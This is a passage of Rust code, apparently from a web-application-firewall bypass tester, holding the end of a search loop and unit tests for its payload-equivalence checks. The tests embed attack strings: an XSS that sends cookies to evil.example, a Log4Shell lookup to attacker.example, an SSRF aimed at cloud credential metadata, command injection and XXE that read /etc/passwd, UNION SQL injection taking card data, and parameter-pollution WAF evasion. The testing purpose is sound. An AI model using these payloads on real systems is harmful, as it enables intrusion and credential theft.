        let refined = WafModel::learn(&samples, 30);
        if refined.n >= arms || prior.is_none() {
            out.model_saved = refined.save(&mpath).is_ok();
        }
    }
    out.sends = sends;
    // Emit the aggregated error tally — at most one line per
    // distinct error string regardless of how many times each fired.
    if !error_tally.is_empty() {
        let mut rows: Vec<(String, usize)> = error_tally.into_iter().collect();
        rows.sort_by_key(|a| std::cmp::Reverse(a.1));
        for (msg, count) in rows {
            if count == 1 {
                eprintln!("warn ({class}): {msg}");
            } else {
                eprintln!("warn ({class}): {count}× {msg}");
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use grammar::equiv::DeliveryShape as D;

    /// §13 dogfood (cumulus): obs-text (high-byte) payloads are LEGAL
    /// HTTP header values (RFC 7230) — they must form real membership
    /// queries, not die as "builder errors". Only NUL/CR/LF are illegal
    /// and correctly excluded from the L* sample.
    #[test]
    fn header_value_accepts_obs_text_rejects_control_bytes() {
        // High bytes (overlong-UTF-8 / raw-byte evasion) — sendable.
        assert!(header_value_from_payload("caf\u{e9}").is_ok());
        assert!(header_value_from_payload("\u{ff}\u{fe}admin").is_ok());
        // Ordinary attack payloads — sendable.
        assert!(header_value_from_payload("' OR 1=1-- -").is_ok());
        // NUL / CR / LF — genuinely un-sendable over HTTP; excluding them
        // from the sample is correct, not a missed bypass.
        assert!(header_value_from_payload("x\r\ny").is_err());
        assert!(header_value_from_payload("x\nINJECT: evil").is_err());
        assert!(header_value_from_payload("x\u{0}y").is_err());
    }

    #[test]
    fn class_mapping_only_returns_supported_classes() {
        assert_eq!(class_for_payload_type(PayloadType::Sql), Some("sql"));
        assert_eq!(class_for_payload_type(PayloadType::Xss), Some("xss"));
        assert_eq!(
            class_for_payload_type(PayloadType::CommandInjection),
            Some("cmdi")
        );
        assert_eq!(
            class_for_payload_type(PayloadType::PathTraversal),
            Some("path")
        );
        assert_eq!(
            class_for_payload_type(PayloadType::TemplateInjection),
            Some("ssti")
        );
        assert_eq!(class_for_payload_type(PayloadType::Ldap), Some("ldap"));
        // Unknown / unsupported → None (anti-rig: never guess a class).
        assert_eq!(class_for_payload_type(PayloadType::Unknown), None);
    }

    #[test]
    fn live_query_appends_to_existing_query_string() {
        let r = build_live_request_for_delivery(
            "https://t.example/search?lang=en",
            &D::Query { param: "q".into() },
            "1' OR '1'='1",
        );
        assert_eq!(r.method, Method::Get);
        assert!(r.url.starts_with("https://t.example/search?"), "{}", r.url);
        assert!(r.url.contains("lang=en"), "lost existing query: {}", r.url);
        assert!(
            r.url.contains("q=1%27"),
            "payload not appended/encoded: {}",
            r.url
        );
        assert!(
            !r.url.contains("/get?"),
            "live path must hit the real URL, not httpbin"
        );
    }

    #[test]
    fn live_path_segment_inserts_before_query() {
        let r = build_live_request_for_delivery(
            "https://t.example/api?v=2",
            &D::PathSegment,
            "../../etc/passwd",
        );
        assert!(r.url.starts_with("https://t.example/api/"), "{}", r.url);
        assert!(
            r.url.ends_with("?v=2"),
            "query must survive after the segment: {}",
            r.url
        );
        assert!(
            !r.url.contains("/anything/"),
            "live path must not use httpbin route"
        );
    }

    #[test]
    fn live_form_and_json_post_to_the_real_target() {
        let f = build_live_request_for_delivery(
            "https://t.example/login",
            &D::FormBody {
                param: "user".into(),
            },
            "a' OR 1=1-- -",
        );
        assert_eq!(f.method, Method::Post);
        assert_eq!(f.url, "https://t.example/login");
        assert!(
            f.headers
                .iter()
                .any(|(k, v)| k == "content-type" && v == "application/x-www-form-urlencoded")
        );
        assert!(String::from_utf8_lossy(f.body.as_ref().unwrap()).starts_with("user="));

        let j = build_live_request_for_delivery(
            "https://t.example/api",
            &D::JsonBody {
                param: "q".into(),
                content_type: None,
            },
            "x\"y",
        );
        assert_eq!(j.url, "https://t.example/api");
        assert!(
            !j.headers.iter().any(|(k, _)| k == "content-type"),
            "JsonBody None must omit Content-Type (the CRS-blind shape)"
        );
        assert_eq!(
            String::from_utf8_lossy(j.body.as_ref().unwrap()),
            r#"{"q":"x\"y"}"#
        );
    }

    #[test]
    fn live_hpp_split_puts_full_payload_last() {
        let r = build_live_request_for_delivery(
            "https://t.example/s",
            &D::HppSplit {
                param: "q".into(),
                parts: 2,
            },
            "UNION SELECT",
        );
        // decoys first, full payload as the last duplicate (last-wins
        // backend binds the attack; WAF sees clean leading values).
        let occurrences = r.url.matches("q=").count();
        assert_eq!(occurrences, 3, "2 decoys + full payload: {}", r.url);
        let last = r.url.rsplit("q=").next().unwrap();
        assert!(
            last.contains("UNION"),
            "payload must be the last q=: {}",
            r.url
        );
    }

    #[test]
    fn verified_bypass_three_gates_hold_here_too() {
        let ok = "1 OR 1=1 --";
        let junk = ")) not sql at all ((";
        assert!(verified_bypass("sql", ok, ok, false, 200));
        assert!(!verified_bypass("sql", ok, ok, true, 200), "WAF-blocked");
        assert!(!verified_bypass("sql", ok, ok, false, 400), "400 malformed");
        assert!(!verified_bypass("sql", ok, junk, false, 200), "non-attack");
        assert!(!verified_bypass("sql", ok, ok, false, 502), "upstream down");
    }

    // ── oracle_valid per class ────────────────────────────────

    #[test]
    fn oracle_valid_unknown_class_refuses_silently_accepting_rig() {
        // ANTI-RIG (LAW 1). The pre-fix behaviour was a permissive
        // `_ => true` fall-through: unknown class → accepted. A typo
        // in the class string upstream would then silently mark every
        // unblocked response as a bypass. Post-fix: unknown class is
        // refused, so the gap is loud and the bench drops the case
        // honestly until a real oracle is wired.
        assert!(!oracle_valid("not_a_class", "x", "x"));
        assert!(!oracle_valid("totally-bogus", "1 OR 1=1", "anything"));
    }

    #[test]
    fn oracle_valid_sql_accepts_valid_tautology() {
        // Numeric-context SQL oracle: `1 OR 1=1` is parseable as an
        // expression injection. With original == transformed the
        // `still_executes` same-attack gate trivially holds (identity is
        // equivalent), and the parse check passes — so an intact tautology
        // is still credited.
        assert!(oracle_valid("sql", "1 OR 1=1", "1 OR 1=1"));
    }

    #[test]
    fn oracle_valid_sql_rejects_tautology_passed_off_as_union_exfil() {
        // SOUNDNESS regression (the CEGIS-moat fix). The original is a
        // structured UNION data-exfil attack; the candidate is a boolean
        // tautology. The tautology IS valid SQLi
        // (`is_valid_expression_injection` returns true for it), so the
        // PRE-FIX `oracle_valid` — which only checked the transformed string
        // and dropped `original` — wrongly credited it as an "equivalent"
        // bypass of the exfil. But a tautology does not exfiltrate the card
        // data: it is a different, weaker attack. The fix requires
        // `still_executes(original, transformed)` too, so the structured
        // tokens (UNION/SELECT/FROM/cards…) must survive. Deleting the
        // `still_executes` conjunct turns this test red.
        let exfil = "1 UNION SELECT cardnum,cvv FROM cards";
        let tautology = "1 OR 1=1-- -";
        // Guard: the tautology really is "valid SQLi" on its own, so this
        // test is exercising the same-attack gate, not the parse gate.
        assert!(
            sql_oracle::is_valid_expression_injection(tautology, DatabaseDialect::Generic),
            "precondition: the tautology must itself parse as valid SQLi, \
             otherwise this test would pass for the wrong reason"
        );
        assert!(
            !oracle_valid("sql", exfil, tautology),
            "a tautology must NOT be credited as equivalent to a UNION exfil"
        );
        // And the sound case still holds: a clean-alphabet / commented
        // re-spelling of the SAME union exfil is accepted.
        assert!(oracle_valid("sql", exfil, exfil));
    }

    #[test]
    fn oracle_valid_sql_rejects_unparseable_noise() {
        // The whole point of the oracle gate.
        assert!(!oracle_valid("sql", "1 OR 1=1", ")) not sql at all (("));
    }

    // ── CEGIS forward-progress (Err arm marks tried) ──────────

    #[tokio::test]
    async fn cegis_errored_candidate_does_not_burn_the_fire_budget() {
        // §7 forward-progress regression (the recorded R2 follow-up).
        //
        // `synthesize` is a PURE deterministic min-score pick over the
        // candidates NOT in `tried`, and the CEGIS `model` only refits on a
        // blocked `Ok`. So if a fired-but-errored candidate is left out of
        // `tried`, the next loop iteration re-synthesizes the IDENTICAL
        // candidate, re-fires the same failing request, and spins until the
        // whole budget is gone — one dead candidate starves the entire pool.
        //
        // Drive the real engine at a closed loopback port so EVERY send errors
        // (connection refused). Pre-fix: the CEGIS `while sends < budget` loop
        // runs to completion, so `out.sends == budget`. Post-fix: each errored
        // candidate is marked `tried`, synthesis advances, and once the pool is
        // exhausted `synthesize` returns `None` and the loop breaks — so
        // `out.sends` is bounded by the (small) candidate pool, far under the
        // budget. Reverting either `tried.insert` in an `Err` arm turns this
        // red (sends jumps back to `budget`).
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(2))
            .build()
            .expect("reqwest client builds");
        // Nothing listens on loopback port 1 → immediate connection-refused.
        let build = |d: &grammar::equiv::DeliveryShape, p: &str| {
            build_request_for_delivery("http://127.0.0.1:1", d, p)
        };
        let budget = 500usize;
        let out = run_equiv_cegis_inner(
            &client,
            build,
            "sql",
            "1 UNION SELECT cardnum FROM cards",
            "cegis-forward-progress-seed",
            "q",
            budget,
            0, // delay_ms
            2, // timeout_secs
            "cegis-fp-test-sig",
            None, // phase_fire_cap (unlimited)
        )
        .await;

        // No `Ok` response ever arrived, so nothing can be credited a bypass.
        assert!(
            out.bypasses.is_empty(),
            "all sends errored — no bypass is provable"
        );
        // The candidate pool (arms × per-arm, post-dedup) is dozens of entries,
        // nowhere near 500. A budget-burn would show as sends == budget.
        assert!(
            out.sends < budget,
            "CEGIS fired {}/{} requests — it re-fired one errored candidate to \
             budget exhaustion instead of advancing (Err arm forgot tried.insert)",
            out.sends,
            budget
        );
    }

    // ── json_escape ───────────────────────────────────────────

    #[test]
    fn json_escape_handles_simple_ascii_unchanged() {
        assert_eq!(json_escape("hello world"), "hello world");
        assert_eq!(json_escape("abc123"), "abc123");
    }

    #[test]
    fn json_escape_escapes_quote_and_backslash() {
        assert_eq!(json_escape(r#""a\b""#), r#"\"a\\b\""#);
    }

    #[test]
    fn json_escape_emits_short_escapes_for_known_controls() {
        assert_eq!(json_escape("\n"), "\\n");
        assert_eq!(json_escape("\r"), "\\r");
        assert_eq!(json_escape("\t"), "\\t");
    }

    #[test]
    fn json_escape_emits_unicode_escape_for_unprintable_controls() {
        // Bell (0x07) has no short-escape; falls to .
        assert_eq!(json_escape("\x07"), "\\u0007");
        // NUL byte.
        assert_eq!(json_escape("\0"), "\\u0000");
        // Vertical tab.
        assert_eq!(json_escape("\x0b"), "\\u000b");
    }

    #[test]
    fn json_escape_passes_high_unicode_through_verbatim() {
        // Anything ≥ 0x20 (printable) flows unchanged — including
        // multi-byte UTF-8. JSON spec permits unescaped non-ASCII
        // as long as it's valid UTF-8.
        assert_eq!(json_escape("café 中文"), "café 中文");
    }

    #[test]
    fn json_escape_output_parses_back_as_valid_json_string() {
        // Round-trip: wrap in `"..."` and serde_json should accept.
        for input in [
            "hello",
            "with \"quotes\"",
            "with \\ backslash",
            "control: \x01\x02\x07",
            "newline:\nand:tab\t",
        ] {
            let wrapped = format!("\"{}\"", json_escape(input));
            let parsed: String =
                serde_json::from_str(&wrapped).expect("escaped output must be valid JSON string");
            assert_eq!(parsed, input, "round-trip mismatch on {input:?}");
        }
    }

    // ── class_for_payload_type ────────────────────────────────

    #[test]
    fn class_for_payload_type_routes_ssrf_nosql_jndi_to_their_sound_oracles() {
        // `classify()` actively returns these three PayloadTypes, and each now
        // has a SAME-EXPLOIT arm in `oracle_valid`. The auto-classifier path
        // (`--class auto`) MUST reach them — previously it dropped all three to
        // `None`, silently demoting `distill`/`tmin` to the WAF-only gate for
        // SSRF, NoSQL, and (most consequentially) Log4Shell payloads.
        assert_eq!(class_for_payload_type(PayloadType::Ssrf), Some("ssrf"));
        assert_eq!(class_for_payload_type(PayloadType::NoSql), Some("nosql"));
        // Jndi is the classifier's name for Log4Shell; the oracle key is
        // "log4shell".
        assert_eq!(class_for_payload_type(PayloadType::Jndi), Some("log4shell"));
    }

    #[test]
    fn class_for_payload_type_ssi_still_none_no_sound_model() {
        // `oracle_valid` has no `ssi` arm, so there is nothing sound to route
        // to — anti-rig: the mapping must NOT invent a class for it.
        assert_eq!(class_for_payload_type(PayloadType::Ssi), None);
        assert_eq!(class_for_payload_type(PayloadType::Unknown), None);
    }

    #[test]
    fn oracle_valid_ssrf_rejects_target_swap_accepts_identity() {
        // The exact over-reduction the weak (`_original`-ignoring) SsrfOracle
        // permitted: an AWS-metadata credential-theft SSRF collapsed to a
        // benign localhost root request. Both are "valid SSRF structure"; only
        // the first is the operator's finding. `still_targets` pins the
        // canonical IPv4 + path, so the swap is now rejected.
        let metadata = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        let localhost = "http://127.0.0.1/";
        assert!(
            !oracle_valid("ssrf", metadata, localhost),
            "target swap must be rejected — different connect target is a different attack"
        );
        assert!(
            oracle_valid("ssrf", metadata, metadata),
            "identity must hold so distill can validate the original before reducing"
        );
    }

    #[test]
    fn oracle_valid_xss_rejects_dropping_the_exfil_action() {
        // The #1 screwdriver case: ddmin must not silently turn a cookie-exfil
        // finding into a benign alert() PoC. `still_executes_xss` requires the
        // original's class-defining markers (`fetch(`, the exfil host) to
        // survive as whole tokens.
        let exfil = "<svg onload=fetch('//evil.example/'+document.cookie)>";
        let benign = "<svg onload=alert(1)>";
        assert!(
            !oracle_valid("xss", exfil, benign),
            "dropping the exfil sink changes the attack — must be rejected"
        );
        assert!(oracle_valid("xss", exfil, exfil), "identity must hold");
    }

    #[test]
    fn oracle_valid_cmdi_rejects_swapping_the_command() {
        // A `cat /etc/passwd` finding must not reduce to a bare `id` probe —
        // different command, different finding. `still_executes_cmd` pins the
        // command verb + target as whole tokens.
        let read_passwd = "; cat /etc/passwd";
        let probe = "; id";
        assert!(
            !oracle_valid("cmdi", read_passwd, probe),
            "swapping the executed command changes the attack — must be rejected"
        );
        assert!(oracle_valid("cmdi", read_passwd, read_passwd), "identity must hold");
    }

    // ── is_valid_xxe / is_valid_log4shell / is_valid_nosql ────

    #[test]
    fn is_valid_log4shell_identity_holds() {
        // A payload compared against itself must validate.
        let p = "${jndi:ldap://attacker.example/x}";
        assert!(is_valid_log4shell(p, p));
    }

    #[test]
    fn is_valid_xxe_identity_holds() {
        let p = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(is_valid_xxe(p, p));
    }

    #[test]
    fn is_valid_nosql_identity_holds() {
        let p = r#"{"$ne": null}"#;
        assert!(is_valid_nosql(p, p));
    }

    // ── oracle_valid: cve_pocs + unknown-class anti-rig ────

    #[test]
    fn oracle_valid_cve_pocs_unmutated_is_accepted() {
        // CVE PoCs have no per-CVE oracle. We accept them only when
        // the variant equals the original (intact transmission).
        let p = "CVE-2024-XXXX exploit string";
        assert!(oracle_valid("cve_pocs", p, p));
    }

    #[test]
    fn oracle_valid_cve_pocs_mutated_is_refused() {
        // A mutated cve_pocs payload has no oracle to confirm the
        // exploit survives — pre-fix this returned `true` and inflated
        // bypass counts.
        let original = "CVE-2024-XXXX exploit string";
        let mutated = "CVE-2024-XXXX exploit string ";
        assert!(!oracle_valid("cve_pocs", original, mutated));
    }

    #[test]
    fn oracle_valid_unknown_class_is_refused() {
        // Pre-fix: `_ => true` accepted anything for an unrecognised
        // class. Post-fix: unknown class is refused — the bench/scan
        // will honestly drop the bypass rather than silently rig it.
        assert!(!oracle_valid("not_a_class", "a", "a"));
        assert!(!oracle_valid("", "", ""));
        assert!(!oracle_valid(
            "graphql",
            "{ user { id } }",
            "{ user { id } }"
        ));
    }

    #[test]
    fn verified_bypass_unknown_class_returns_false_even_when_gates_pass() {
        // The 3-gate oracle composes oracle_valid AND. With unknown
        // class refusing, even a clean (!blocked, 200) response is NOT
        // a bypass — closes the rig where adding a new class without an
        // oracle silently counted every pass as success.
        assert!(!verified_bypass(
            "future_class_no_oracle",
            "payload",
            "payload",
            false,
            200
        ));
    }

    #[test]
    fn differential_off_is_identical_to_verified() {
        // Anti-rig: with differential OFF, the gate must equal `verified`
        // for BOTH truth values — the headline metric is unchanged.
        assert!(differential_confirmed(true, false, false));
        assert!(differential_confirmed(true, false, true));
        assert!(!differential_confirmed(false, false, true));
        assert!(!differential_confirmed(false, false, false));
    }

    #[test]
    fn differential_on_requires_base_blocked() {
        // A confirmed variant only counts when the un-evaded base was
        // BLOCKED in that delivery (the WAF actually policed the attack).
        assert!(
            differential_confirmed(true, true, true),
            "verified + base-blocked = real bypass"
        );
        assert!(
            !differential_confirmed(true, true, false),
            "verified but base NOT blocked = WAF never policed it → not a bypass"
        );
        // A non-verified variant is never credited regardless of the base.
        assert!(!differential_confirmed(false, true, true));
        assert!(!differential_confirmed(false, true, false));
    }

    /// Exhaustive property over ALL 8 (verified, differential, base_blocked)
    /// combinations — the gate's full truth table, derived independently of
    /// the implementation expression:
    ///   * differential = false  ⇒ result == verified (base_blocked ignored)
    ///   * differential = true   ⇒ result == (verified && base_blocked)
    #[test]
    fn differential_confirmed_full_truth_table() {
        for verified in [false, true] {
            for differential in [false, true] {
                for base_blocked in [false, true] {
                    let expected = if differential {
                        verified && base_blocked
                    } else {
                        verified
                    };
                    let got = differential_confirmed(verified, differential, base_blocked);
                    assert_eq!(
                        got, expected,
                        "differential_confirmed({verified}, {differential}, {base_blocked}) \
                         = {got}, expected {expected}"
                    );
                }
            }
        }
    }

    #[test]
    fn differential_off_ignores_base_blocked_entirely() {
        // With differential OFF, base_blocked must have ZERO influence: for a
        // fixed `verified`, both base values yield the same result.
        for verified in [false, true] {
            assert_eq!(
                differential_confirmed(verified, false, false),
                differential_confirmed(verified, false, true),
                "base_blocked must not affect the result when differential is off"
            );
            assert_eq!(differential_confirmed(verified, false, false), verified);
        }
    }

    #[test]
    fn differential_on_is_logical_and_of_verified_and_base_blocked() {
        // With differential ON, the gate is exactly `verified AND base_blocked`.
        for verified in [false, true] {
            for base_blocked in [false, true] {
                assert_eq!(
                    differential_confirmed(verified, true, base_blocked),
                    verified && base_blocked
                );
            }
        }
    }
}
